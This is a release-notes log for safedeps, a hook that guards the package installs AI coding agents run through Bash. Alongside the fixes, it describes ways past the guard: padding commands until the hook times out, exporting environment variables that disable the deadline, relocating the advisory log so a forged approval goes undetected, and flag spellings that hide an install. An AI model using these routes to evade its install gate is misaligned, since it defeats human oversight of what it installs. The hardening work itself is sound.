Two things made it invisible. The code's stated reason is npm-shaped: a bare `npm install` is a lockfile install that names no new package, so falling through is correct for npm, and the effect gate catches the result anyway. That reasoning was carried into the ecosystems where the command gate is the authority, where an unpinned install names a package and nothing is behind the gate. And the direction is inverted — the hidden path denies fail-closed when no spec can be extracted while the plain path allows under the identical condition, so one predicate is read in opposite directions inside one file.

### What changed

- **The ungated install leaves a record.** An install that names a package as a bare operand with no version, in an ecosystem with no effect gate behind the command gate, writes `UNGATED` to `~/.safedeps/advisory.log` with the ecosystem and the command. (The operand-only scope left gaps, closed in v2.14.1.) Until now it passed with no trace, which contradicted the invariant that every bypass must be observable.
- **It changes no verdict.** Refusing every unpinned install is a policy change that would block ordinary `cargo add x` workflows, so it stays the repo owner's decision. The record exists so that decision can be made from evidence.
- **The silence is scoped as carefully as the record.** File-driven installs (`-r`, `-c`, `-e`), bare lockfile installs, npm, and installs pinned in a form the spec extractor reads stay out of the log. That last qualifier matters: the extractor reads `cargo add --vers` but not `cargo install --version`, so a version can be present and the ledger gate still not run -- and the record correctly fires. A record that fires on routine installs is background noise, and background noise is the same as no record.

### Verification

- 68-case corpus replayed against `main`: zero decision change, so the record is verdict-neutral
- both halves pinned in `scripts/test/consumer-forms.sh` — ten named-unpinned installs recorded, twelve routine or already-gated commands silent
- mutation-verified against the tree without the fix (red at the first record assertion)

---

## v2.14.0 — hook entry shim: a broken checkout stops being anonymous (shipped)

Status: shipped as v2.14.0.

The installed hooks run live from the repo checkout through the skill symlink, so a checkout that is temporarily broken (merge conflict markers, a half-saved edit, a missing file) changes hook behavior on the very next Bash call. On 2026-08-04 a real mid-merge window blocked Bash for every session on the machine, and the only explanation anyone saw was a bash parser error; an unrelated session routed the outage as its own infra defect. The failure direction was also luck, not design: a parse error happens to exit 2 (blocking on both engines), while a missing file (127) or a runtime crash (1) is a non-blocking hook failure that silently removes the install gate.

### What changed

- **The registered command is now the entry shim** `scripts/safedeps-hook-entry.sh pre|post`. A healthy hook passes through untouched (measured overhead ~7 ms on a ~34 ms baseline). On any non-zero hook exit the shim classifies the breakage (does not parse / crashed / missing), detects an in-progress merge or rebase in the checkout and says so, and exits 2 with the breadth ("every session on this machine"), the cause, and the recovery path.
- **The hook exit-code contract is now explicit**: the real hooks exit 0 on every designed path; decisions travel as JSON. Any intentional non-zero exit in a hook script is a bug (`AGENTS.md`).
- **The shim's own failure mode is measured, not assumed**: a broken shim degrades to the pre-shim status quo (blocking with a raw parse error) and never to something wider; pinned in the battery.
- **Workflow rule**: never resolve merge conflicts in the main checkout — integrate in a worktree, move `main` fast-forward-only. The shim softens the blast; the discipline removes the window.
- **`scripts/test/hook-entry.sh`** pins the whole contract and joins `npm test`; the installer prunes the legacy direct-path registrations idempotently.

## v2.14.1 — the record had holes where it claimed coverage (shipped)

Status: shipped as v2.14.1.

The v2.13.2 record was validated with three notes. Two of them turned out to be behavior, not wording, and that distinction is the release: fixing them as prose would have narrowed a sentence and left the hole, which is the same invariant violation the record was introduced to end — just relocated from the code to the docs.

### What changed

- **A source flag consumes its argument, not the command.** Seeing `-r`, `-c`, or `-e` silenced the whole install. But `-c` is not a source flag at all — a constraint file only bounds versions while the install target still arrives on the command line — so `pip install -c constraints.txt evil` installed `evil` with no record. `-r requirements.txt evil` and `-e . evil` were silenced the same way. Each flag now consumes exactly its own argument.
- **A URL's `@` is not a version.** The `@` test meant to skip already-pinned tokens also matched the user field of a VCS URL, so `git+ssh://git@host/evil.git` went unrecorded while `git+https://host/evil.git` was recorded — the same install, split by transport.
- **Maven carries its coordinate in a flag.** `-Dartifact=<group>:<name>` never reached an operand walk, so Maven's actual idiom sat outside the record while a form nobody writes (`mvn dependency:get evil`) was inside it. A two-field coordinate is now reported and a three-field one stays quiet. Whether Maven accepts the versionless form is unverified — no Maven on the measuring machine — and for a record the unresolved case resolves toward reporting: a spurious line costs a line, a missing one costs the invariant.
- **Working-tree installs stay out.** `pip install .` and `pip install ./pkg` build from the tree rather than fetching, so they name no package. A module path such as `example.com/evil` is not a local path and stays reported.
- **The docs stopped explaining the boundary by flag.** The line is whether a package is named. The README said file-driven installs "name no package", which was never true of `-c`.
- **`SKILL.md` now states the boundary too.** It is the manifest agents read, and it told them to run `check` first without saying that omitting the version means nothing is checked.

### Verification

- 106-case corpus replayed against v2.13.2: zero decision change, so the fixes stay inside the observability layer
- every boundary pinned in `scripts/test/consumer-forms.sh` from both sides, including the Maven, `git+ssh`, and `-r <file> <pkg>` rows that had no coverage before
- the notes came from an adversarial probe of the record's edges, not from re-reading the code

---

### v2.14.2 — the per-ecosystem flag table (patch on v2.14.1)

The v2.14.1 fix applied pip's flag table to every ecosystem. `-t` and `-f` take a value for pip and are booleans for go (`go get -t`), gem (`--force`), and cargo, so the walk ate the package that followed: `go get -t example.com/evil` went silent while `gem install --force evil` stayed reported — one install split by which spelling the author used. That is exactly the mistake v2.14.1 diagnosed in `-c`, repeated one axis over: grouping flags by shape instead of by meaning. Caught by the validator, not by the author.

Value-consuming flags are now resolved per ecosystem, and an unknown flag is assumed to take no value — guessing wrong that way costs a spurious line, while guessing wrong the other way drops the install this record exists to catch. `-e` consumes nothing at all now: its argument is judged like any other token, so `-e .` falls out as a working-tree build while `-e git+ssh://…` stays the fetch it is. Maven's coordinate flag is also read on either side of the goal.

One boundary is pinned as deliberate rather than fixed: `mvn -Dartifact=… dependency:get` never reaches the record because install *recognition* (`mvn dependency:get`) does not match a flag before the goal. That belongs to command recognition, and widening it is the carrier enumeration `ARCHITECTURE.md` declines to grow.

Verified against a `git archive` of v2.13.2: decisions stay unchanged, and every registry-fetch form recorded then is recorded now. Two forms did move out of the record -- `pip install .` and `pip install ./local-pkg` -- which is the working-tree boundary v2.14.1 declared and the battery pins; they build from the tree rather than fetching. Stating it as a blanket "nothing moved" was wrong twice in this plan's history, so the claim is now scoped to what the battery checks.

---

### v2.14.3 — the same class, third time (patch on v2.14.2)

v2.14.2 announced that value-consuming flags were resolved per ecosystem, but only gated `-t` and `-f`. `-r` and `-c` stayed unconditional, and gem's `-r` is `--remote`, a boolean — so `gem install -r evil` went silent while `gem install --remote evil` was recorded. The same install split by spelling, for the third time in this plan, and this time the shipped prose was ahead of the code rather than behind it.

The whole table is now gated on the pypi family, which is the only one that consumes an argument for any of these spellings.

The verification sentence is also rewritten rather than restated. "Nothing moved from recorded to silent" was falsified twice here: `pip install .` and `pip install ./local-pkg` did move out, which is the working-tree boundary v2.14.1 declared and the battery pins. The claim is now scoped to registry-fetch forms, which is what the battery actually checks. A blanket claim that the author's own corpus cannot falsify is not a verification.

---

### v2.14.4 — the record's short-form trap (patch on v2.14.3)

`-i` was missing from the pypi value-consuming table while `--index-url` was in it. This did not hide an install; it invented one. The mirror URL read as an operand, so `pip install -i <mirror> -r requirements.txt` filed a spurious record and `pip install -i <mirror>` did too. Same defect as the three silences this plan already fixed, pointing the other way — which is the reason both directions now sit in the battery. Fixing one direction leaves the other.

Also corrected: "already-pinned installs stay out" was too strong. The spec extractor reads `cargo add --vers` but not `cargo install --version`, so a version can be present while the ledger gate still does not run — and the record correctly fires. The claim now says "pinned in a form the spec extractor reads", and the surprising-but-true row is pinned in the battery so it does not read as a stray line.

Two more silences are pinned rather than changed: `pip install --index-url <url>` alone names no package, and `pip install /tmp/evil.whl` installs from the filesystem. Both were already correct and now cannot drift unnoticed.

---

### v2.14.5 — pin what is known-odd, and stop citing numbers nobody can check (patch on v2.14.4)

Three validator notes that sat outside the verdict, closed as a set.

`bundle add evil --version 1.0.0` was named alongside the cargo form but only cargo got a battery row. Both are recorded even though a version is present, because the spec extractor reads `cargo add --vers` and neither `cargo install --version` nor `bundle add --version` — so the ledger gate really did not run. Both rows are pinned now, for the same reason: a true-but-surprising record should not read as a stray line.

`pip install --proxy <url> -r requirements.txt` still files a spurious record, and that is pinned rather than fixed. An unknown flag is assumed to take no value; guessing the other way would drop the install this record exists to catch. Widening the value table instead is the enumeration this work was burned by four times. The row makes the trade-off visible instead of leaving it to be rediscovered as a bug.

The last one is about evidence, not code. A previous release cited "159 forms" from a scratch corpus that no reader can reconstruct — the substantive claims held up under independent replay, but the number was decoration, and a number nobody can check reads as verification without being any. `AGENTS.md` now asks for counts a reader can reproduce: the battery's own form count, `npm test`'s ok lines, or a committed corpus.

---

## v2.15.0 — the guard answers on its own budget, so the runtime never kills it mid-judgment (shipped)

Status: shipped as v2.15.0.

v2.13.0 recorded that crossing the 30s hook budget is fail-open, and left it as an argument for linearizing the scanner. That was the wrong conclusion to stop at. Linearization moves the crossing point; it does not decide what happens past it, and past it the gate vanished without a word. Padding a command to ~30KB was the whole attack, and for `pip`, `cargo`, `go`, and `gem` — where the command gate is the authority rather than an advisory layer — that is a universal bypass requiring no knowledge of the scanner at all.

The runtime's timeout behavior is not ours to change. Answering before it fires is.

### What changed

- **The guard keeps a budget of its own**, smaller than the runtime's (default 20s against the registered 30s). It runs its judgment in a child, and if that child has not answered by the deadline the guard answers for it: deny, because an install it could not judge must not run. The runtime never gets to kill it mid-flight, so there is nothing left to fail open.
- **The deny says which kind of deny it is.** "I did not finish looking" and "I looked and found something" are different claims, and a reader who cannot tell them apart learns to route around the gate. The reason string leads with `UNDECIDED, not unsafe`, states that nothing was detected, and says what to do instead. It is recorded to `advisory.log` like every other bypass or unavailability.
- **Commands below the engage size pay nothing.** The machinery costs one integer comparison until the command is large enough to be anywhere near the budget (default 1KB, measured at ~0.1s against a 30s budget — about 300x of headroom). The engage size is a performance gate, not a security boundary; the security boundary is the wall-clock budget, which stays honest on a machine slower or faster than the one these numbers came from.
- **The deadline is polled by the guard itself, not by a watchdog subshell.** A watchdog has to sleep in fixed steps, and killing one while it sits in `sleep` does not return until that sleep expires — measured, that rounded every engaged call up to the next whole second (a 788ms judgment took 1050ms). Polling from the parent starts at 50ms and doubles to 1s, so a fast judgment loses at most the first step.
- **The deadline signals the child's whole process tree, then escalates.** A shell does not act on a signal while a foreground external command is running, and the expensive part of the judgment is exactly such a command — so signalling the child shell alone arrives whenever that command happens to finish, measured 9.1s late against a 20s budget, which spends the entire margin the self budget was there to create. Descendants are resolved from the child's own pid (never by name pattern), signalled TERM, then KILL after a short grace. A deadline that can be outlasted is not a deadline.

### Verification / measured bounds

- Cost curve on the development machine: 1KB → 0.1s, 4KB → 0.68s, 8KB → 2.5s, 16KB → 9.6s, 24KB → 21.4s, 28KB → 29.3s, 32KB → 37.8s. The 30s runtime budget is crossed between 28KB and 32KB, reproducing the bound recorded in v2.13.0 from the other side.
- With the budget engaged, a 32KB command is denied at ~20.2s against a 20s budget, and a 16KB padded `pip install` at ~20.9s: the answer arrives with ~9s still on the runtime's clock. The overshoot is bounded by one poll step (≤1s) **only because the deadline reaches the work and not just the shell** — with the signal sent to the child shell alone the same input answers at ~30s, past the runtime budget, and is therefore still fail-open.
- Machinery overhead where it engages, same input both ways: 4KB 684ms → 820ms, 8KB 2482ms → 2623ms. Below the engage size there is no child and no measurable change.
- `scripts/test/self-budget.sh` pins both directions and joins `npm test`: over-budget commands and padded `pip`/`cargo`/`go`/`gem` installs deny; the deny is marked undecided, is not phrased as a finding, and reaches `advisory.log`; benign commands, `npm run`, unapproved installs, and engaged-but-in-budget commands decide exactly as before.
- The battery carries its own mutation check: with the budget disengaged, the identical over-budget command walks through. Its first draft sized that input ~1.3x the budget and reported a false pass, so the committed version uses a ~5x margin.
- **The first version of this release shipped a defect the battery could not see, and it is worth recording how.** A `trap ... EXIT TERM INT` was added to the guard as insurance against a signalled child leaking the state lock. Naming a signal in `trap` replaces its default disposition, so the child stopped dying at the deadline and ran its judgment to completion: a 16KB padded `pip install` answered at 38.9s against a 30s runtime budget. Every over-budget case in the battery used a 1s budget, which lands the deadline early in the scan where the child is between external commands and takes a signal at once — so the corpus stayed green. The regression that covers it now sizes the input so the deadline lands deep in the scan (12KB against an 11s budget: ~12s enforced, ~17s not) and asserts the *overshoot*, which is the quantity the runtime actually cares about.

### The npm assumption did not survive being measured

v2.13.0 said the PostToolUse effect gate "remains the enforcement authority" for npm past the command gate's budget. That was an assumption about a hook nobody had timed. Measured 2026-08-04 with the same protocol used for PreToolUse — a sandbox project, a hook that records when it starts and when it finishes, a control inside the budget and an experiment past it:

- control (1s work, 5s budget): started and finished.
- experiment (20s work, 5s budget): started, never finished.

**PostToolUse is killed at its budget too.** The effect gate is registered with the same 30s, and its work — `npm ci`, `npm install`, `npm rebuild`, plus an OSV batch over the whole closure — is bounded by the user's project and the network rather than by anything safedeps controls. So npm has the same exposure, and it is worse in kind than the command gate's: the pre-hook's kill lets one unjudged command through, while the post-hook's kill can land in the middle of a rollback.

This release does not fix that. A post-install gate cannot deny — the command has already run — so its answer to "I could not finish" is a different design question, tracked as `safedeps/effect-gate-killed-mid-rollback`. What is fixed here is the claim: the docs no longer say npm is covered past the budget, because it is not.

---

### v2.15.1 — the self budget has a ceiling, because a boundary the user can move is a default (patch on v2.15.0)

v2.15.0's whole claim is that the guard answers on its own budget instead of vanishing past the runtime's. One environment variable undid it: `SAFEDEPS_SELF_BUDGET_SECONDS` had no upper bound, and any value above the registered 30s hook timeout hands the kill back to the runtime — silently, and with the fail-open exactly as it was before the release.

The motive to set such a value is an ordinary one, which is what makes it worth closing. Someone who meets an `UNDECIDED` deny on a large command reads it as "the budget is short" and raises it. No intent to disable anything, and the boundary is gone anyway.

- **The value is clamped to 25s**, and the clamp is one-directional: lower values are honoured as given, because a shorter budget only denies earlier. `SAFEDEPS_RUNTIME_BUDGET_SECONDS` (30) and `SAFEDEPS_SELF_BUDGET_MAX_SECONDS` (25) are named constants next to the budget they bound.
- **The 30s is hardcoded, and the reason is recorded next to it.** The hook payload does not carry the runtime's budget, and registrations from several settings files all fire, so the guard cannot tell which one launched it. It names the number safedeps itself registers — `PRE_HOOK_TIMEOUT_SECONDS` in the installer — and the smoke test pins the two constants together so an installer change cannot leave the guard computing against a stale one. A hand-edited registration below 30s is outside what the constant can know.
- **The 5s of headroom is the guard's cost outside the budget window**, not a round number: up to 1s waiting out the final poll step, up to 0.5s of TERM grace before the KILL, ~0.1s of reap, `jq`, and process start. A 1.6s structural worst case, against 0.73–1.05s measured end to end and flat from 4KB to 256KB of command text (2026-08-04, same machine as the 30s kill measurement).
- **The clamp is observable.** It is announced on stderr, recorded in `advisory.log`, and named in the `UNDECIDED` deny reason. A silently reduced budget would leave the user believing their value is the one running and debugging the next surprise against a number that was never true.

- **The first version of the clamp shipped the same hole in a different grammar, and cross-validation caught it before release.** It validated with `^[0-9]+$` and then let the deadline consume the raw string in `$(( ))`. Bash arithmetic accepts more than that regex does, so `+40`, ` 40` and `0x28` failed validation, skipped the clamp, and evaluated to 40 as the budget anyway — a 64KB command under `+40` produced no answer for 41s, past the runtime's kill. Two grammars for one value is the defect; the value is now normalized once (whitespace and a leading `+` read the way whoever typed them meant it) and only the normalized digits reach arithmetic. Anything else is not a budget: the default is used, which is inside the ceiling, and it is announced on the same channels as the clamp. `10#` keeps `08` from being an octal error.

- **A second cross-validation round found the same shape one layer down, in the value's range rather than its grammar.** With one grammar in place, `^[0-9]+$` still does not count digits, and bash integers are 64-bit and wrap silently. A value that wraps negative is not greater than the ceiling, so it passed the clamp untouched, and the deadline multiplication wrapped it again into a time that never arrives: a 30-digit budget produced no answer for over 600s. Digit count is now checked in the string domain, before arithmetic sees the value — more than nine digits is unambiguously above the ceiling and is clamped as such, so the rule stays "anything above the ceiling is clamped" with no exception for how it was written. Nine digits is about 31 years of seconds.

Verification: `scripts/test/self-budget.sh` gains a 64KB padded `pip install` under a 600s budget. That input's natural scan runs past 300s on the development machine, so only the ceiling can bring the answer back inside the runtime's 30s — it is denied as `UNDECIDED` at ~26s, with the clamp stated in all three places, while a budget under the ceiling passes through untouched and unannounced. The same 64KB case runs again under `" 40"` to pin the grammar fix end to end (25-26s where it was 41s), with cheap parse cases for `+40`, `0x28`, `abc`, `-5`, `4.5` and `08`. The overflow round adds the 30-digit budget at 64KB (over 600s before the digit gate, 26s after), the exact 64-bit bound, and a zero-padded short value that must stay five seconds rather than be judged by its length. `scripts/test/smoke.sh` pins the guard's runtime-budget constant to the installer's registered timeout and asserts the ceiling sits below it.

---

### v2.15.2 — the engage size tunes the deadline, it no longer switches it off (patch on v2.15.1)

v2.15.1 put a ceiling on the budget. It left the condition that decides whether the budget runs at all: `SAFEDEPS_BUDGET_ENGAGE_BYTES`. Raise that past the commands that matter and the judgment runs inline with no deadline — the same fail-open through the knob someone reaches for once the budget stops moving. Measured: a 32KB padded `pip install` answers in 21s at the default engage size and takes 198s with it raised, against a 30s runtime kill either way.

The battery was itself the proof that the door was open: its mutation check disabled the gate by raising the engage size, which is the same gesture a user makes to reduce friction.

- **The engage size is clamped to 4KB.** On the v2.15.0 cost curve a command just under 4KB is judged in about 0.68s, roughly 44x inside the runtime budget. Tuning between the 1KB default and the ceiling is what the knob is for and stays available.
- **Turning the deadline off is a separate act with a separate name.** `SAFEDEPS_BUDGET_DISABLED` does nothing else and announces itself on stderr and in `advisory.log` every time it takes effect. A test that only knows it passes, and not that it catches the defect, is not evidence — so the off switch exists; it just is not the same lever as the tuning knob.
- **Both knobs now go through one reader.** They failed the same way in v2.15.0 and v2.15.1, and a second hand-rolled parser is how they drift apart again. Whitespace, a leading `+`, leading zeros, non-numbers, and values too long for arithmetic are handled identically for both, and every fallback or clamp is announced.
- **The knob reader refuses over-long input before parsing it.** That reader runs before the child spawn, outside the deadline it serves, and it has been the slow path twice. v2.15.1's per-zero strip loop was quadratic (28.9s on 40000 leading zeros, 63.2s on 60000). The regex that replaced it cut the constant about a hundredfold and left the class alone — the reader still quadrupled its time for every doubling of the input (50k 0.34s, 400k 20.2s, 800k 88.0s), so 500000 zeros still burned 224s end to end, and the first fix only moved the failure a digit to the right. What bounds it is a length ceiling on the input, checked in one cheap pass before any pattern touches the string: no reachable value is 32 characters long, since nine digits is already about 31 years of seconds. Refused values are reported by length rather than quoted whole, so a megabyte of padding does not become a megabyte of stderr.

Verification: `scripts/test/self-budget.sh` (30 ok) pins the engage clamp with a padded install that must still be denied on the budget, the announcement on both channels, silent tuning inside the ceiling, a non-numeric engage size falling back to the default, the disable path as the mutation check, and a 500000-zero budget that must still answer inside the runtime budget with its value reported by length rather than quoted.

Still open, recorded rather than fixed: several one-value knobs replace canonical truth rather than tune it — `SAFEDEPS_OSV_API_URL` / `SAFEDEPS_KEV_CATALOG_URL` / `SAFEDEPS_GHSA_API_URL` repoint the advisory source, `SAFEDEPS_NPM_CLOSURE_FIXTURE_JSON` and `SAFEDEPS_YARN_INFO_FIXTURE_NDJSON` replace closure resolution with canned data, `SAFEDEPS_LEDGER_DEFAULT_TTL_DAYS` can make approvals never expire, and `SAFEDEPS_ADVISORY_LOG` repoints the channel that every bypass is supposed to be observable on. These are test seams and mirror support, and the friction story for at least the URLs is real (a network that blocks osv.dev). Tracked as `safedeps/truth-source-knobs-have-no-declaration`.

One more knob is the same shape as the one this release closed, and the enumeration above missed it on the first pass: **`SAFEDEPS_BUDGET_CHILD`**. It is the recursion marker the parent sets on the child it spawns, so exporting it makes the parent believe it *is* the child and skip the deadline entirely — measured, a 12KB padded `pip install` answers in 3s normally and 32s with it exported, with nothing on stderr and nothing in `advisory.log`. It has no ceiling, its name does not say "off switch", and unlike the engage size there is no friction story that leads anyone to it by accident. Cross-validation caught it inside 90 lines of the clamp this release added, which is the honest measure of how far a fresh reader sees past the change they just made. Tracked as `safedeps/budget-child-marker-is-an-unnamed-off-switch`.

---

### v2.15.3 — the parent/child marker moves out of the environment (patch on v2.15.2)

v2.15.2 shipped with this gap named in its release notes rather than implied: `SAFEDEPS_BUDGET_CHILD`, the marker the parent sets on the child it spawns, was an environment variable. Exporting it made the parent believe it was already the child and skip the deadline entirely — measured, a 12KB padded `pip install` answers in 3s normally and 32s with the marker exported, past the 30s runtime kill, with nothing on stderr and nothing in `advisory.log`. A second off switch, beside the named one, with no ceiling, no name that says what it does, and no record.

Cross-validation found it 90 lines from the clamp v2.15.2 added, which is the honest measure of how far a reader sees past the change they just made.

- **The marker travels in argv.** The engines invoke the hook through `safedeps-hook-entry.sh`, which passes no arguments, so there is no route from the environment into the flag — the only process that can set it is the one that spawns the child. Structural, not a check.
- **The old variable is reported, not ignored in silence.** A signal that used to switch the deadline off and now does nothing fails in the other direction if it says nothing: whoever exports it would keep believing the deadline is off. It is announced on stderr and in `advisory.log`, and it points at `SAFEDEPS_BUDGET_DISABLED` for the deliberate act.
- **The deadline machinery is unchanged.** The tree kill resolves descendants from the child's own pid and the reap waits on that pid; neither reads the marker. Verified rather than assumed, because "structurally closed" is a claim like any other.

Verification: through the real hook path (the entry shim) with the marker exported, a 12KB padded `pip install` is denied `UNDECIDED` at 3s against a 2s budget. The deadline landing deep in the scan still overshoots its 11s budget by 1s, the same as before, and leaves no orphaned processes. `scripts/test/self-budget.sh` (32 ok) pins both the deadline surviving an exported marker and the announcement on both channels.

With this landed, the "Known gap" note in the v2.15.2 release stands closed: the deadline has one off switch, it has a name, and it logs.

---

### v2.15.4 — the manual-install docs register what the installer registers (patch on v2.15.3)

`SKILL.md`, `README.md` and `README.ko.md` told a reader doing a manual install to register `safedeps-pre-guard.sh` and `safedeps-post-verify.sh` as the hook commands. The installer registers `safedeps-hook-entry.sh pre|post`, and `AGENTS.md` says the shim is the registered command — the docs had been describing a different installation than the one the tool performs, for as long as the shim has existed. `README.md` even explains the shim two hundred lines above the block that tells you not to use it.

Following the docs still gated installs, so nothing looked broken. What it dropped is the shim's whole job: turning a broken checkout — mid-merge, half-saved, crashed hook — from a silently disabled gate into an explained fail-closed deny. The reader had no way to know they were running without it.

- **The manual JSON registers the shim**, with the same 30s timeout the installer writes, and says in one line why the registered command is the shim rather than the hook.
- **`SKILL.md` no longer declares hooks in its frontmatter.** No runtime reads that block as a registration, so it was a second description of an installation with nothing keeping it true — which is how it drifted. Registration has one channel: the installer.
- **The comparison is machine-made now.** `scripts/test/smoke.sh` reads the installer's own entry-hook constant and fails if either README stops naming it for `pre` and `post`, if either registers a hook script directly, or if `SKILL.md` grows its own declaration again.

Verified by running the documented command as an engine would: the exact string from `README.md`, invoked on a payload, denies an unapproved `pip` install. The drift check was mutation-tested by restoring the old command, which turns it red.

---

### v2.15.5 — the drift check pins the value, not just the string (patch on v2.15.4)

v2.15.4's drift check read the installer's entry-hook constant and failed if the docs stopped naming it. It did not read the timeout. So the docs could keep naming the right command at a number the installer had stopped writing — the same defect one field over from the one that release closed, which is how it was found: the release notes named it as a known limit rather than implying it was covered.

- **The timeout is pinned like the command**, per event, read from the line beside the command rather than from anywhere in the file. The guard already reads `PRE_HOOK_TIMEOUT_SECONDS` for its own ceiling, so this is the same constant read a third time rather than a new place for the truth to live.
- **`SKILL.md` keeps no hook declaration, and that is now written down as a decision.** Claude does document skill-frontmatter hooks, and their schema is event-keyed with `matcher` and `command:` — but they are scoped to the skill's lifecycle and run only while the skill is active, and this gate has to judge every Bash call whether or not the skill was invoked. The documented form cannot carry it. The drift check therefore fails only on the legacy `script:` shape that no schema reads; it deliberately does not forbid the documented shape, because blocking a working feature by grep is not the same as removing a dead one. `AGENTS.md` carries the judgment.

Verification by mutation, three ways: moving the installer constant alone turns the existing guard pin red; moving a doc timeout alone turns the new check red; moving the installer constant **and** the guard constant together — the shape a legitimate budget change takes — leaves the docs behind and is caught by the new check, which is the case the old one missed.

---

### v2.15.6 — the prose names the hook budget once, and that once is pinned (patch on v2.15.5)

v2.15.5 pinned the timeout inside the two registration JSON blocks. The number went on living in six sentences that no check read — `SKILL.md`, both READMEs, both ARCHITECTUREs, `AGENTS.md` — so moving the constant would have left the docs stating a figure the installer no longer writes. The same drift one field over, again, and named as a known limit in the v2.15.5 notes rather than implied covered, which is why it is closed here.

- **One canonical sentence per language states the number**, in the ARCHITECTURE paragraph that already explains where it comes from, and smoke pins that sentence to `PRE_HOOK_TIMEOUT_SECONDS`. Everywhere else the prose names the budget instead of spelling it.
- **Dated measurements keep their figures.** "Killed at their registered timeout (30s when measured, 2026-08-04)" is a fact about a day; it stays true when the constant moves, and it is written so it does not read as the current setting.
- **The rule is proximity, not a list of phrasings.** A sentence putting the installer's own figure next to a budget word must be the canonical one or a dated measurement. Enumerating the ways to phrase a restatement is the shape this repo has been burned by twice; removing the number from the restatements is what actually closes it.

Stated plainly, because a check whose limits are unread gets mistaken for coverage: the canonical pin is what closes this, and it works whatever the prose looks like. The proximity rule is a backstop, and a leaky one — its document list is hardcoded, it matches one written form of the figure and only mid-line, it is line-based, and its measurement exemption tests for the word rather than for a date. Two further axes are outside both checks and need the documented JSON parsed against the installer's output: a second registration block for the same event, and a doc that swaps the `pre` and `post` registrations. All of it is written beside the check, where someone deciding whether to trust it will be looking.

Mutation-verified in an isolated clone: moving both installer constants, the guard constant, and both JSON blocks to 45 while leaving the canonical sentence at 30 turns it red; restoring a numeral to `SKILL.md` turns the proximity rule red.

---

### v2.15.7 — the record cannot be moved out from under the check (patch on v2.15.6)

Three releases closed knobs that could switch the deadline off. The enumeration behind them listed a different family and left it recorded rather than fixed: knobs that replace canonical truth instead of tuning it. The worst of them is `SAFEDEPS_ADVISORY_LOG`, because `advisory.log` is not only where every bypass is written — `re-check` reads it as the oracle for whether a ledger approval ever happened.

Measured: a forged ledger entry that `re-check` flags as `suspected_forgery` on the default path stops being flagged when `SAFEDEPS_ADVISORY_LOG` points at a caller-written file saying the approval happened. The same environment that writes the forgery hands the check its evidence. Nothing in the repo, the docs, the tests, or the installer ever set that variable — it was an unused knob holding open the one file the forgery check depends on.

- **The path is derived from `SAFEDEPS_HOME`.** Record and ledger move together or not at all, which is what keeps the check and the thing it checks in one trust domain. A set-but-ignored variable is reported on stderr and written to the canonical log, because a signal that used to do something and now does nothing must not go quietly inert.
- **The channel is single by construction now.** The hooks always wrote `$SAFEDEPS_HOME/advisory.log` while the CLI and providers honored the variable, so the observation channel could split in two depending on which half of the tool spoke.
- **Moved advisory sources are announced, not refused.** Provider URLs, the closure fixtures, and a non-default ledger TTL are real needs — a mirror on a network that blocks osv.dev, a fixture in this very suite. Each deviation is named once per run in `advisory.log`, at startup rather than on the first provider call, so a command that reaches no provider is still recorded. What is not allowed is a run judged against a moved truth looking exactly like a run judged against OSV.

Verification: the e2e forgery battery gains the relocation case and the moved-source record, and both were mutation-tested in an isolated clone by restoring the environment override — the forgery case turns red.

---

### v2.15.8 — the notice exists on the hook path too (patch on v2.15.7)

v2.15.7 said a run judged against a moved advisory source announces itself. That was true of the CLI. The PreToolUse guard does not source the provider stack, so it had nowhere to say it — a guard run under a moved source wrote nothing. It was harmless only because the guard does not currently reach a provider or a fixture, which is a reason that disappears the day the code changes. A channel that exists only where the claim is already true is not a channel.

- **The notice moved to `lib/truth-sources.sh`**, which the guard sources unconditionally, resolving the path from its own location with plain expansion — no environment variable, and no subshell on a path that runs for every Bash call. Making the source conditional would mean restating the knob list at the call site in order to decide whether to read the knob list, and a second copy is how the first goes stale. Cross-validation rejected the first attempt for exactly the reason the release before it exists: the path came from an environment variable and an unreadable file returned quietly, so pointing it at `/dev/null` left a run under a moved source recording nothing — an unnamed off switch, rebuilt beside the invariant that forbids them. An unreadable library is now an announced unavailability on both channels. One consequence is worth knowing before editing that file: it is sourced on every Bash call, so a parse error in it takes the guard down and the entry shim turns that into a fail-closed deny machine-wide. That is the direction this repo prefers over silence, but it is a wider blast radius than a seventy-line file suggests.
- **Defaults and the comparison live in that one file.** They were duplicated: the URL a run is compared against was written separately from the URL it was assigned, which is the shape a whole release went to fixing one field over.
- **Two more knobs are named.** `SAFEDEPS_NPM_OVERRIDES_JSON` replaces the overrides the closure verdict folds in — the e2e suite says so in its own assertion name — and `SAFEDEPS_RECHECK_FIXTURE_JSON` replaces the re-check output the daily alert reads. Both were outside the v2.15.7 enumeration, which is why that list is now written as a growing one rather than a complete one.

Verification: a guard run under a moved source records it and names the overrides knob; the unmoved control is built by unsetting the suite's own fixtures, so it asserts the notice tracks the environment rather than always firing.

---

### v2.16.0 — the effect gate finishes for ordinary projects, and an unfinished rollback is loud

v2.15.0 measured that PostToolUse is killed at its budget like PreToolUse, and stopped there: the exposure was recorded as structural, because nobody had measured where the effect gate actually crosses 30s. Measured now, with the harness committed as `scripts/measure/effect-gate-cost.sh`, the honest answer was worse than "structural".

The gate rides on two axes. One is the project's lockfile closure. The other was nobody's design: the gate asked the ledger about each closure package separately, and every one of those questions walked the whole approved-spec directory, spawning two or three `jq` processes per ledger file. That is O(closure x ledger).

- real 738-entry ledger: closure of 1 -> 10.8s, 2 -> 18.5s, **4 -> 36.6s**
- empty ledger, a 1081-package application lockfile: 256 -> 24.0s, **512 -> 72.0s, 1024 -> 100.7s**

A closure of four packages is nearly every real `npm install`. So for the machine this was measured on, npm's "delayed detection" was in practice no detection, and a fresh machine with nothing approved still crossed on any ordinary application.

- **The ledger is read once per closure, not once per package.** The predicate did not move: it is jq source that both the single-file validator and the new index embed, so "does the ledger approve this spec" still has one implementation rather than a fast copy and a slow one. Same harness, same ledger, same lockfile: closure of 4 goes 36.6s -> 2.1s, and the ledger stage is flat at ~0.23s from a closure of 4 to 512. Equivalence was checked against the previous per-file reader before landing — 60 specs drawn from the real ledger (owner, transitive, absent), identical verdicts on all 60. That corpus cannot express one deliberate change, so state it separately: a transitive entry with no ecosystem of its own used to inherit the *queried* ecosystem and now inherits its *owner's*, which is the stricter reading. Cross-validation found the two diverging cases by generating from the ledger schema rather than from that corpus; both diverge fail-closed, and the real ledger holds no such entry.
- **A corrupt ledger entry cannot empty the index.** jq stops at the first file it cannot parse, so the index hands files over in chunks and retries a failed chunk one file at a time, naming what broke. An emptied index reads as "nothing is approved", which is a rollback of a clean install — a typo in one ledger file must not cost that.
